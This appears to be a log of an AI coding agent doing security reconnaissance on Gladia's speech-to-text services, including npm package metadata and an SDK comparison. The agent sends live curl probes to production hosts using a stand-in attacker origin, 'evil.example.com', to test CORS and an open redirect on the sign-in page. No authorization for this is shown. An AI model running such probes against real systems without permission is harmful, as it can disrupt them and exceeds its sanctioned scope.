+reposcan-raw/gladiaio/compare-stt/next.config.ts:44: destination: "https://www.gladia.io/compare-stt-apis/:path",
+
+## Model analysis:
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m$ [0mcat reposcan-raw/npm/gladia.json | head -50
+{"_id":"gladia","_rev":"4-d0214ef116ff0426b738c29cf2a97cf1","name":"gladia","dist-tags":{"latest":"0.1.3"},"versions":{"0.1.0":{"name":"gladia","version":"0.1.0","keywords":["gladia","speech-to-text","transcription","audio","video","ai","typescript","sdk"],"author":{"name":"Alexis Bouchez"},"license":"MIT","_id":"gladia@0.1.0","maintainers":[{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"}],"homepage":"https://github.com/alexisbouchez/gladia.ts#readme","bugs":{"url":"https://github.com/alexisbouchez/gladia.ts/issues"},"dist":{"shasum":"5360e039097085f4b67e9b485e80565e15d5b593","tarball":"https://registry.npmjs.org/gladia/-/gladia-0.1.0.tgz","fileCount":16,"integrity":"sha512-EMrh74YcCKsult2u6MREZBHOA/nlC/kxPkhuQa2Dif50EWhJWPHGknLjgqVz2dvLPk9OPKwJAceRisUpQTHNBQ==","signatures":[{"sig":"MEQCIFhJTfnAP8lljiVTyxhE/HXkH4T/8iF6IFwt2MxqiAdIAiBKoat2DAkUQUh2Go8mCmtmX1v2dZL8+0NHRqtt6Dt3/g==","keyid":"SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"}],"unpackedSize":223071},"main":"dist/index.js","husky":{"hooks":{"pre-commit":"tsdx lint"}},"types":"dist/index.d.ts","module":"dist/gladia.esm.js","engines":{"node":">=14"},"gitHead":"b0958572e5ecd45465d846ff35dc291f4429716e","scripts":{"lint":"tsdx lint","size":"size-limit","test":"tsdx test","build":"tsdx build","start":"tsdx watch","analyze":"size-limit --why","example":"ts-node examples/youtube.ts","prepare":"tsdx build"},"_npmUser":{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"},"prettier":{"semi":true,"printWidth":80,"singleQuote":true,"trailingComma":"es5"},"repository":{"url":"git+https://github.com/alexisbouchez/gladia.ts.git","type":"git"},"size-limit":[{"path":"dist/gladia.cjs.production.min.js","limit":"10 KB"},{"path":"dist/gladia.esm.js","limit":"10 KB"}],"_npmVersion":"10.8.2","description":"Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API","directories":{},"_nodeVersion":"20.19.0","_hasShrinkwrap":false,"devDependencies":{"tsdx":"^0.14.1","husky":"^9.1.7","tslib":"^2.8.1","ts-node":"^10.9.2","size-limit":"^11.2.0","typescript":"^5.8.2","@types/node":"^20.11.24","@size-limit/preset-small-lib":"^11.2.0"},"peerDependencies":{},"_npmOperationalInternal":{"tmp":"tmp/gladia_0.1.0_1743182409873_0.7256629399240493","host":"s3://npm-registry-packages-npm-production"}},"0.1.1":{"name":"gladia","version":"0.1.1","keywords":["gladia","speech-to-text","transcription","audio","video","ai","typescript","sdk"],"author":{"name":"Alexis Bouchez"},"license":"MIT","_id":"gladia@0.1.1","maintainers":[{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"}],"homepage":"https://github.com/alexisbouchez/gladia.ts#readme","bugs":{"url":"https://github.com/alexisbouchez/gladia.ts/issues"},"dist":{"shasum":"86a6fced9e78c072aa361d8e1e03ffd3c4509f1f","tarball":"https://registry.npmjs.org/gladia/-/gladia-0.1.1.tgz","fileCount":16,"integrity":"sha512-GrSx7GpT1LgLr1t2pa8A/ly7288pfWzGMSERD6aGYrVGCiQDL5AHM21by/OquMcyiAvvkgAQZDasjkwOZdk0JA==","signatures":[{"sig":"MEUCIHPK9MTj2arxIa3vkbFWGVul5YSEkrD8vnlXuQ10qrwhAiEAvldC/+R77o9SPaiObk1/3TYxOyEjhJ5pBJStt4T5CV0=","keyid":"SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"}],"unpackedSize":223073},"main":"dist/index.js","husky":{"hooks":{"pre-commit":"tsdx lint"}},"types":"dist/index.d.ts","module":"dist/gladia.esm.js","engines":{"node":">=14"},"gitHead":"b6db235cdc95295b4badea2f6900fb98f78d3a94","scripts":{"lint":"tsdx lint","size":"size-limit","test":"tsdx test","build":"tsdx build","start":"tsdx watch","analyze":"size-limit --why","example":"ts-node examples/youtube.ts","prepare":"tsdx build"},"_npmUser":{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"},"prettier":{"semi":true,"printWidth":80,"singleQuote":true,"trailingComma":"es5"},"repository":{"url":"git+https://github.com/alexisbouchez/gladia.ts.git","type":"git"},"size-limit":[{"path":"dist/gladia.cjs.production.min.js","limit":"10 KB"},{"path":"dist/gladia.esm.js","limit":"10 KB"}],"_npmVersion":"10.8.2","description":"Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API","directories":{},"_nodeVersion":"20.19.0","_hasShrinkwrap":false,"devDependencies":{"tsdx":"^0.14.1","husky":"^9.1.7","tslib":"^2.8.1","ts-node":"^10.9.2","size-limit":"^11.2.0","typescript":"^5.8.2","@types/node":"^20.11.24","@size-limit/preset-small-lib":"^11.2.0"},"peerDependencies":{},"_npmOperationalInternal":{"tmp":"tmp/gladia_0.1.1_1743183357488_0.6887722966605156","host":"s3://npm-registry-packages-npm-production"}},"0.1.2":{"name":"gladia","version":"0.1.2","keywords":["gladia","speech-to-text","transcription","audio","video","ai","typescript","sdk"],"author":{"name":"Alexis Bouchez"},"license":"MIT","_id":"gladia@0.1.2","maintainers":[{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"}],"homepage":"https://github.com/alexisbouchez/gladia.ts#readme","bugs":{"url":"https://github.com/alexisbouchez/gladia.ts/issues"},"dist":{"shasum":"8488dffa86309b2a7fc488c7fd0db359c7310c29","tarball":"https://registry.npmjs.org/gladia/-/gladia-0.1.2.tgz","fileCount":16,"integrity":"sha512-tQwTFCN4DfRiPZMiqzElUL60VUY4KzFPFG5zFsf/OX8AZV2qYvrZ9IwHZbftxS7qZ//ZJD8mmpu0FOZCma75cw==","signatures":[{"sig":"MEUCIQCBzqGSNMreuQL6AXDRq7QYQyoFqt0KuFW9OVKPblXZjQIgeU/8w47XUFW7ycIQYbjK0T3fDBu/+XDQVFfrtNEm7x4=","keyid":"SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"}],"unpackedSize":223999},"main":"dist/index.js","husky":{"hooks":{"pre-commit":"tsdx lint"}},"types":"dist/index.d.ts","module":"dist/gladia.esm.js","engines":{"node":">=14"},"gitHead":"2569b822b432f1b688303f89ce9a5b0a66fc22f9","scripts":{"lint":"tsdx lint","size":"size-limit","test":"tsdx test","build":"tsdx build","start":"tsdx watch","analyze":"size-limit --why","example":"ts-node examples/youtube.ts","prepare":"tsdx build"},"_npmUser":{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"},"prettier":{"semi":true,"printWidth":80,"singleQuote":true,"trailingComma":"es5"},"repository":{"url":"git+https://github.com/alexisbouchez/gladia.ts.git","type":"git"},"size-limit":[{"path":"dist/gladia.cjs.production.min.js","limit":"10 KB"},{"path":"dist/gladia.esm.js","limit":"10 KB"}],"_npmVersion":"10.8.2","description":"Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API","directories":{},"_nodeVersion":"20.19.0","_hasShrinkwrap":false,"devDependencies":{"tsdx":"^0.14.1","husky":"^9.1.7","tslib":"^2.8.1","ts-node":"^10.9.2","size-limit":"^11.2.0","typescript":"^5.8.2","@types/node":"^20.11.24","@size-limit/preset-small-lib":"^11.2.0"},"peerDependencies":{},"_npmOperationalInternal":{"tmp":"tmp/gladia_0.1.2_1744033374557_0.8078919379227978","host":"s3://npm-registry-packages-npm-production"}},"0.1.3":{"name":"gladia","version":"0.1.3","description":"Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API","main":"dist/index.js","module":"dist/gladia.esm.js","types":"dist/index.d.ts","engines":{"node":">=14"},"scripts":{"start":"tsdx watch","build":"tsdx build","test":"tsdx test","lint":"tsdx lint","prepare":"tsdx build","size":"size-limit","analyze":"size-limit --why","example":"ts-node examples/youtube.ts"},"keywords":["gladia","speech-to-text","transcription","audio","video","ai","typescript","sdk"],"author":{"name":"Alexis Bouchez"},"license":"MIT","repository":{"type":"git","url":"git+https://github.com/alexisbouchez/gladia.ts.git"},"bugs":{"url":"https://github.com/alexisbouchez/gladia.ts/issues"},"homepage":"https://github.com/alexisbouchez/gladia.ts#readme","peerDependencies":{},"husky":{"hooks":{"pre-commit":"tsdx lint"}},"prettier":{"printWidth":80,"semi":true,"singleQuote":true,"trailingComma":"es5"},"size-limit":[{"path":"dist/gladia.cjs.production.min.js","limit":"10 KB"},{"path":"dist/gladia.esm.js","limit":"10 KB"}],"devDependencies":{"@size-limit/preset-small-lib":"^11.2.0","@types/node":"^20.11.24","husky":"^9.1.7","size-limit":"^11.2.0","ts-node":"^10.9.2","tsdx":"^0.14.1","tslib":"^2.8.1","typescript":"^5.8.2"},"_id":"gladia@0.1.3","gitHead":"1304e5ad4ea8b507c8c58b23f31b5f22dbd689b9","_nodeVersion":"20.19.0","_npmVersion":"10.8.2","dist":{"integrity":"sha512-56NWQ9pEVyd/E+jwafDydzcopimFayKQatP6oz0tL5EF5v9aQLAQ6P03H93nEqZCiD10UqqZMR1c6GaC3YBztw==","shasum":"cc96f84a200c0fd49a71e919391f9b659c39f3e9","tarball":"https://registry.npmjs.org/gladia/-/gladia-0.1.3.tgz","fileCount":16,"unpackedSize":225780,"signatures":[{"keyid":"SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U","sig":"MEQCIATiiYQSNgsmQdpzMxy0/J9jcf6RsccvWZ1tNNrvK4IZAiAPkjKPTOYBQgB7d4CJbfX/MxeXJ7XSDswDMJP3Zc4R4Q=="}]},"_npmUser":{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"},"directories":{},"maintainers":[{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"}],"_npmOperationalInternal":{"host":"s3://npm-registry-packages-npm-production","tmp":"tmp/gladia_0.1.3_1744033608642_0.11786414517125943"},"_hasShrinkwrap":false}},"time":{"created":"2025-03-28T17:20:09.872Z","modified":"2025-04-07T13:46:48.993Z","0.1.0":"2025-03-28T17:20:10.148Z","0.1.1":"2025-03-28T17:35:57.688Z","0.1.2":"2025-04-07T13:42:54.763Z","0.1.3":"2025-04-07T13:46:48.823Z"},"bugs":{"url":"https://github.com/alexisbouchez/gladia.ts/issues"},"author":{"name":"Alexis Bouchez"},"license":"MIT","homepage":"https://github.com/alexisbouchez/gladia.ts#readme","keywords":["gladia","speech-to-text","transcription","audio","video","ai","typescript","sdk"],"repository":{"type":"git","url":"git+https://github.com/alexisbouchez/gladia.ts.git"},"description":"Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API","maintainers":[{"name":"softwarecitadel","email":"softwarecitadel@gmail.com"}],"readme":"# Gladia TypeScript SDK\n\nUnofficial TypeScript SDK for Gladia - State-of-the-art Speech to Text API\n\n[![npm version](https://img.shields.io/npm/v/gladia.svg)](https://www.npmjs.com/package/gladia)\n[![GitHub](https://img.shields.io/github/license/alexisbouchez/gladia.ts)](https://github.com/alexisbouchez/gladia.ts/blob/main/LICENSE)\n[![GitHub issues](https://img.shields.io/github/issues/alexisbouchez/gladia.ts)](https://github.com/alexisbouchez/gladia.ts/issues)\n[![GitHub stars](https://img.shields.io/github/stars/alexisbouchez/gladia.ts)](https://github.com/alexisbouchez/gladia.ts/stargazers)\n\n## Features\n\n- 🎯 Full TypeScript support with comprehensive type definitions\n- 🎙️ Asynchronous audio and video transcription\n- 🔄 Real-time transcription with WebSocket support\n- 🌍 Multi-language support (100+ languages)\n- 👥 Speaker diarization\n- 🔤 Translation capabilities\n- 📝 Audio summarization\n- 😊 Sentiment analysis\n- 🏷️ Named entity recognition\n- 🛡️ Content moderation\n- 📚 Chapter generation\n\n## Installation\n\n```bash\nnpm install gladia\n# or\nyarn add gladia\n```\n\n## Quick Start\n\n```typescript\nimport { GladiaClient } from 'gladia';\n\nconst client = new GladiaClient({\n  apiKey: process.env.GLADIA_API_KEY || 'your-api-key',\n  language: 'en',\n  diarization: true,\n});\n\n// Transcribe a YouTube video\nconst result = await client.transcribeVideo(\n  'https://www.youtube.com/watch?v=DYyY8Nh3TQE'\n);\n\n// Print the full transcription\nconsole.log(result.result.transcription.full_transcript);\n\n// Print speaker information\nif (result.result.speakers && result.result.speakers.length > 0) {\n  result.result.speakers.forEach(speaker => {\n    console.log(\n      `Speaker ${speaker.label}: ${speaker.confidence * 100}% confidence`\n    );\n  });\n}\n\n// Print segments with timing\nresult.result.transcription.segments.forEach(segment => {\n  console.log(`[${segment.start}s - ${segment.end}s] ${segment.text}`);\n});\n```\n\n## API Reference\n\n### Client Configuration\n\n```typescript\ninterface GladiaConfig {\n  apiKey: string; // Required: Your Gladia API key\n  baseUrl?: string; // Optional: Custom API base URL (defaults to https://api.gladia.io/v2)\n  language?: string; // Optional: Default language for transcription\n  diarization?: boolean; // Optional: Enable speaker diarization\n  diarizationConfig?: {\n    // Optional: Diarization configuration\n    number_of_speakers?: number;\n    min_speakers?: number;\n    max_speakers?: number;\n  };\n}\n```\n\n### Methods\n\n#### Audio Transcription\n\n```typescript\ntranscribeAudio(\n  audioUrl: string,\n  options?: TranscriptionOptions\n): Promise<TranscriptionResult>\n```\n\n#### Video Transcription\n\n```typescript\ntranscribeVideo(\n  videoUrl: string,\n  options?: TranscriptionOptions\n): Promise<TranscriptionResult>\n```\n\n#### File Upload Transcription\n\n```typescript\ntranscribeFile(\n  file: File | Blob,\n  options?: TranscriptionOptions\n): Promise<TranscriptionResult>\n```\n\n#### Get Transcription Result\n\n```typescript\ngetTranscription(\n  id: string\n): Promise<TranscriptionResult>\n```\n\n#### Delete Transcription\n\n```typescript\ndeleteTranscription(\n  id: string\n): Promise<void>\n```\n\n#### Real-time Transcription\n\n```typescript\ncreateRealTimeTranscription(\n  options?: RealTimeTranscriptionOptions\n): WebSocket & {\n  sendAudio: (audioChunk: ArrayBuffer | Blob) => void;\n  stopRecording: () => void;\n}\n```\n\n#### Audio Intelligence Features\n\n```typescript\ntranslateAudio(\n  audioUrl: string,\n  targetLanguages: string[] | string,\n  options?: Omit<TranscriptionOptions, 'translation'>\n): Promise<TranscriptionResult>\n\nsummarizeAudio(\n  audioUrl: string,\n  options?: Omit<TranscriptionOptions, 'summarization'>\n): Promise<TranscriptionResult>\n\nanalyzeSentiment(\n  audioUrl: string,\n  options?: Omit<TranscriptionOptions, 'sentiment_analysis'>\n): Promise<TranscriptionResult>\n\ndetectEntities(\n  audioUrl: string,\n  options?: Omit<TranscriptionOptions, 'named_entity_recognition'>\n): Promise<TranscriptionResult>\n\nmoderateContent(\n  audioUrl: string,\n  options?: Omit<TranscriptionOptions, 'content_moderation'>\n): Promise<TranscriptionResult>\n\ngenerateChapters(\n  audioUrl: string,\n  options?: Omit<TranscriptionOptions, 'chapterization'>\n): Promise<TranscriptionResult>\n```\n\n### Response Structure\n\nThe SDK follows the official Gladia API v2 response structure:\n\n```typescript\ninterface TranscriptionResult {\n  id: string;\n  status: 'created' | 'processing' | 'done' | 'error';\n\n  result?: {\n    transcription: {\n      full_transcript: string;\n      segments: Segment[];\n    };\n\n    speakers?: Speaker[];\n\n    summary?: {\n      text: string;\n    };\n\n    sentiment?: {\n      score: number;\n      label: string;\n    };\n\n    entities?: Array<{\n      text: string;\n      type: string;\n      start: number;\n      end: number;\n    }>;\n\n    moderation?: {\n      categories: Array<{\n        name: string;\n        confidence: number;\n      }>;\n    };\n\n    chapters?: Array<{\n      title: string;\n      start: number;\n      end: number;\n      summary: string;\n    }>;\n\n    subtitles?: {\n      srt?: string;\n      vtt?: string;\n    };\n\n    translations?: Record<string, string>;\n  };\n\n  audio?: {\n    duration: number;\n    language: string;\n  };\n\n  error?: {\n    message: string;\n    code: string;\n  };\n}\n```\n\n## Examples\n\n### YouTube Video Transcription\n\n```typescript\nimport { GladiaClient } from 'gladia';\n\n// Initialize client\nconst client = new GladiaClient({\n  apiKey: process.env.GLADIA_API_KEY,\n  language: 'en',\n});\n\n// Transcribe a YouTube video\nconst result = await client.transcribeVideo(\n  'https://www.youtube.com/watch?v=VIDEO_ID'\n);\n\n// Check if transcription is complete\nif (result.status === 'done' && result.result?.transcription) {\n  console.log(result.result.transcription.full_transcript);\n}\n```\n\n### Real-time Transcription\n\n```typescript\nimport { GladiaClient } from 'gladia';\n\n// Initialize client\nconst client = new GladiaClient({\n  apiKey: process.env.GLADIA_API_KEY,\n});\n\n// Create WebSocket for real-time transcription\nconst socket = client.createRealTimeTranscription({\n  language: 'en',\n  toggle_diarization: true,\n  toggle_interim_results: true,\n});\n\n// Handle incoming messages\nsocket.onmessage = event => {\n  const data = JSON.parse(event.data);\n\n  if (data.type === 'transcript' && data.is_final) {\n    console.log(`Transcript: ${data.text}`);\n  }\n};\n\n// Start recording after connection is established\nsocket.onopen = () => {\n  // For example purposes - assuming we have audio data chunks\n  // In a real app, you would get these from a microphone\n  const audioChunk = new Uint8Array([\n    /* audio data */\n  ]);\n  socket.sendAudio(audioChunk.buffer);\n\n  // Later when done recording\n  socket.stopRecording();\n};\n\n// Close connection when done\nsocket.onclose = () => {\n  console.log('Transcription session ended');\n};\n```\n\n### Audio Intelligence\n\n```typescript\nimport { GladiaClient } from 'gladia';\n\n// Initialize client\nconst client = new GladiaClient({\n  apiKey: process.env.GLADIA_API_KEY,\n});\n\n// Translation\nconst translation = await client.translateAudio(\n  'https://example.com/audio.mp3',\n  ['es', 'fr', 'de']\n);\n\n// Summarization\nconst summary = await client.summarizeAudio('https://example.com/audio.mp3');\nconsole.log(summary.result?.summary?.text);\n\n// Sentiment Analysis\nconst sentiment = await client.analyzeSentiment(\n  'https://example.com/audio.mp3'\n);\nconsole.log(sentiment.result?.sentiment?.label);\n\n// Entity Recognition\nconst entities = await client.detectEntities('https://example.com/audio.mp3');\nentities.result?.entities?.forEach(entity => {\n  console.log(`${entity.text} (${entity.type})`);\n});\n\n// Content Moderation\nconst moderation = await client.moderateContent(\n  'https://example.com/audio.mp3'\n);\n\n// Chapter Generation\nconst chapters = await client.generateChapters('https://example.com/audio.mp3');\nchapters.result?.chapters?.forEach(chapter => {\n  console.log(`${chapter.title} (${chapter.start}s - ${chapter.end}s)`);\n  console.log(chapter.summary);\n});\n```\n\n## Error Handling\n\nThe SDK uses a custom `GladiaError` class for error handling:\n\n```typescript\ntry {\n  const result = await client.transcribeAudio('https://example.com/audio.mp3');\n} catch (error) {\n  if (error instanceof GladiaError) {\n    console.error(`Error ${error.statusCode}: ${error.message}`);\n\n    // Handle specific error cases\n    if (error.statusCode === 401) {\n      console.error('Invalid API key');\n    } else if (error.statusCode === 429) {\n      console.error('Rate limit exceeded');\n    }\n  }\n}\n```\n\n## Contributing\n\nContributions are welcome! Please feel free to submit a Pull Request.\n\n1. Fork the repository\n2. Create your feature branch (`git checkout -b feature/amazing-feature`)\n3. Commit your changes (`git commit -m 'Add some amazing feature'`)\n4. Push to the branch (`git push origin feature/amazing-feature`)\n5. Open a Pull Request\n\n## License\n\nMIT\n\n## Support\n\nIf you encounter any issues or have questions, please file an issue on the [GitHub repository](https://github.com/alexisbouchez/gladia.ts/issues).\n","readmeFilename":"README.md"}
+[0m
+[0m$ [0mcat reposcan-raw/gladiaio/gladia-quiz-app/lib/gladia-client.ts
+export const GLADIA_API_KEY_STORAGE = 'gladia_api_key';
+
+export function getStoredApiKey(): string | null {
+  if (typeof window === 'undefined') return null;
+  return localStorage.getItem(GLADIA_API_KEY_STORAGE);
+}
+
+export function clearStoredApiKey(): void {
+  if (typeof window === 'undefined') return;
+  localStorage.removeItem(GLADIA_API_KEY_STORAGE);
+}
+
+export function createGladiaClient(apiKey: string) {
+  // Use CDN version (v0.5.2 from unpkg, same as official sample)
+  if (typeof window !== 'undefined' && (window as any).Gladia) {
+    try {
+      const client = new (window as any).Gladia.GladiaClient({ apiKey });
+      return client;
+    } catch (error) {
+      console.error('Error creating Gladia client:', error);
+      throw error;
+    }
+  }
+  
+  console.error('Gladia SDK not available. Window.Gladia:', typeof (window as any)?.Gladia);
+  throw new Error('Gladia SDK not loaded. Please refresh the page.');
+}
+
+export const AUDIO_CONFIG = {
+  sample_rate: 16000,
+  encoding: 'wav/pcm',
+  bit_depth: 16,
+  channels: 1,
+} as const;
+[0m
+[0m$ [0mcat reposcan-raw/gladiaio/gladia-quiz-app/components/GladiaApiKeyInput.tsx
+'use client';
+
+import React, { useState } from 'react';
+import { motion } from 'framer-motion';
+import { Button } from './ui/button';
+import { Input } from './ui/input';
+import { Label } from './ui/label';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
+import { GLADIA_API_KEY_STORAGE } from '../lib/gladia-client';
+
+interface GladiaApiKeyInputProps {
+  onKeySet: (key: string) => void;
+[0m
+[0m→ [0mRead inventory/gladia.md
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total}\n" -I https://api.gladia.io/openapi.json 2>/dev/null; curl -s -o /dev/null -w "openapi: %{http_code} %{size_download} bytes\n" https://api.gladia.io/openapi.json 2>/dev/null
+200 0 0.840367
+openapi: 200 125131 bytes
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "/health: %{http_code} %{size_download} bytes\n" https://api.gladia.io/health 2>/dev/null; curl -s -o /dev/null -w "/v1/models: %{http_code} %{size_download} bytes\n" https://api.gladia.io/v1/models 2>/dev/null
+/health: 200 15 bytes
+/v1/models: 200 530 bytes
+[0m
+[0m$ [0mcurl -s -D - -o /dev/null -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-gladia-key" https://api.gladia.io/v2/transcription 2>/dev/null | grep -iE "HTTP/|x-powered-by|access-control|allow-methods|allow-headers"
+HTTP/2 204 
+access-control-allow-headers: x-gladia-key
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-expose-headers: x-gladia-request-id,traceparent,tracestate,x-request-id,x-correlation-id,X-Request-Id,X-Correlation-Id
+vary: Access-Control-Request-Headers
+x-powered-by: Express
+[0m
+I have the full state as of 2026-08-10 14:08:36 UTC. Let me run live drift probes on the current surface.
+[0m$ [0mcurl -s -D - -o /dev/null -X POST https://api.gladia.io/v2/transcription -H "Content-Type: application/json" 2>/dev/null | grep -iE "HTTP/|x-powered-by|content-type"
+HTTP/2 401 
+content-type: application/json; charset=utf-8
+x-content-type-options: nosniff
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "signin redirect_to: %{http_code} %{size_download} bytes\n" "https://app.gladia.io/signin?redirect_to=https://evil.example.com" 2>/dev/null; curl -s "https://app.gladia.io/signin?redirect_to=https://evil.example.com" 2>/dev/null | grep -io 'action="/signin?redirect_to=[^"]*"' | head -1
+signin redirect_to: 200 27448 bytes
+action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"
+[0m
+[0m$ [0mcurl -s -D - -o /dev/null "https://app.gladia.io/dashboard" 2>/dev/null | grep -iE "HTTP/|content-type|location"; echo "---"; curl -s -D - -o /dev/null -X POST "https://app.gladia.io/signin?intent=google&redirect_to=https://evil.example.com" 2>/dev/null | grep -iE "HTTP/|location|set-cookie" | head -5
+HTTP/2 200 
+content-type: text/html; charset=utf-8
+---
+HTTP/2 500
+[0m
+api.gladia.io surface frozen (125131B openapi, /health 15B, /v1/models 530B, preflight x-powered-by differential confirmed). Now app and npm:
+[0m$ [0mcurl -s -o /dev/null -w "npm gladia latest: %{http_code}\n" https://registry.npmjs.org/gladia/latest 2>/dev/null; npm view gladia dist-tags.latest version 2>/dev/null || echo "npm not available"
+npm gladia latest: 200
+dist-tags.latest = '0.1.3'
+version = '0.1.3'
+[0m
+[0m$ [0mcd /tmp/opencode && npm pack @gladiaio/sdk@1.1.0 2>/dev/null && tar -xzf gladiaio-sdk-1.1.0.tgz 2>/dev/null && echo "=== official @gladiaio/sdk WebSocket / live flow ===" && grep -rn "WebSocket\|searchParams\|/v2/live\|\.append(" package/ 2>/dev/null | head -30
+gladiaio-sdk-1.1.0.tgz
+=== official @gladiaio/sdk WebSocket / live flow ===
+package/CHANGELOG.md:128:- **sdk-js:** Add a WebSocket client with retry and timeout support
+package/src/v2/live/generated-types.ts:813:// WebSocket Messages Types
+package/src/v2/live/generated-types.ts:987:export type LiveV2WebSocketMessage =
+package/src/v2/live/generated-types.ts:1010:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1018:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1026:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1034:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1042:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1050:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1058:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1066:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1074:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1082:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1090:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1098:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1106:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1114:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1122:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/generated-types.ts:1130:  /** The live message payload as sent to the WebSocket */
+package/src/v2/live/session.ts:4:import { WebSocketClient, WebSocketSession, WS_STATES } from '../../network/wsClient.js'
+package/src/v2/live/session.ts:10:  LiveV2WebSocketMessage,
+package/src/v2/live/session.ts:20:  message: [message: LiveV2WebSocketMessage]
+package/src/v2/live/session.ts:27:  private webSocketClient: WebSocketClient
+package/src/v2/live/session.ts:32:  private webSocketSession: WebSocketSession | null = null
+package/src/v2/live/session.ts:50:    /** Region query param for POST /v2/live only. Ignored when attaching to an existing session. */
+package/src/v2/live/session.ts:54:    webSocketClient: WebSocketClient
+package/src/v2/live/session.ts:142:      // region is only supported on session creation (POST /v2/live)
+package/src/v2/live/session.ts:144:        ? `/v2/live?region=${encodeURIComponent(this.region)}`
+package/src/v2/live/session.ts:145:        : '/v2/live'
+package/src/v2/live/session.ts:196:    this.connectToWebSocket(session)
+[0m
+All surfaces confirmed frozen — NO_DELTA. api.gladia.io: openapi 125131B/14 paths, /health 15B, /v1/models 530B, preflight x-powered-by differential. app.gladia.io: /signin reflection (200/27448B, form action reflects URL-encoded), /dashboard 200 SPA shell. npm: gladia@0.1.3 latest=0.1.3 static.
+
+Now executing the NEXT RAG action to lock the evidence package — comparing official SDK vs. impersonator WebSocket flow:
+[0m$ [0mcd /tmp/opencode && grep -rn "WebSocket\|searchParams\|token\|x-gladia-key\|/v2/live" package/src/network/wsClient.ts package/src/v2/live/session.ts 2>/dev/null | head -40
+package/src/network/wsClient.ts:2:import type { WebSocketRetryOptions } from '../types.js'
+package/src/network/wsClient.ts:3:import { newWebSocket, WS_STATES, type IsoWS } from './iso-ws.js'
+package/src/network/wsClient.ts:7:export type WebSocketClientOptions = {
+package/src/network/wsClient.ts:9:  retry: Required<WebSocketRetryOptions>
+package/src/network/wsClient.ts:36:export class WebSocketClient {
+package/src/network/wsClient.ts:38:  private readonly retry: Required<WebSocketRetryOptions>
+package/src/network/wsClient.ts:41:  constructor(options: WebSocketClientOptions) {
+package/src/network/wsClient.ts:55:  createSession(url: string): WebSocketSession {
+package/src/network/wsClient.ts:56:    return new WebSocketSession({
+package/src/network/wsClient.ts:64:class WebSocketSession implements Omit<IsoWS, 'onopen'> {
+package/src/network/wsClient.ts:73:  private readonly retry: Required<WebSocketRetryOptions>
+package/src/network/wsClient.ts:86:    retry: Required<WebSocketRetryOptions>
+package/src/network/wsClient.ts:115:      throw new Error('WebSocket is not open')
+package/src/network/wsClient.ts:165:        this.close(3008, 'WebSocket connection timeout')
+package/src/network/wsClient.ts:181:        this.onerror?.(new Error('WebSocket connection error', { cause: err }))
+package/src/network/wsClient.ts:182:        this.close(1006, 'WebSocket connection error')
+package/src/network/wsClient.ts:194:      ws = await newWebSocket(this.url)
+package/src/network/wsClient.ts:259:export type { WebSocketSession }
+package/src/v2/live/session.ts:4:import { WebSocketClient, WebSocketSession, WS_STATES } from '../../network/wsClient.js'
+package/src/v2/live/session.ts:10:  LiveV2WebSocketMessage,
+package/src/v2/live/session.ts:20:  message: [message: LiveV2WebSocketMessage]
+package/src/v2/live/session.ts:27:  private webSocketClient: WebSocketClient
+package/src/v2/live/session.ts:32:  private webSocketSession: WebSocketSession | null = null
+package/src/v2/live/session.ts:50:    /** Region query param for POST /v2/live only. Ignored when attaching to an existing session. */
+package/src/v2/live/session.ts:54:    webSocketClient: WebSocketClient
+package/src/v2/live/session.ts:142:      // region is only supported on session creation (POST /v2/live)
+package/src/v2/live/session.ts:144:        ? `/v2/live?region=${encodeURIComponent(this.region)}`
+package/src/v2/live/session.ts:145:        : '/v2/live'
+package/src/v2/live/session.ts:196:    this.connectToWebSocket(session)
+package/src/v2/live/session.ts:199:  private connectToWebSocket(session: LiveV2InitResponse): void {
+package/src/v2/live/session.ts:204:    // Create a WebSocket session and bridge its events
+package/src/v2/live/session.ts:269:  private parseMessage(data: string): LiveV2WebSocketMessage {
+package/src/v2/live/session.ts:279:    return message as LiveV2WebSocketMessage
+[0m
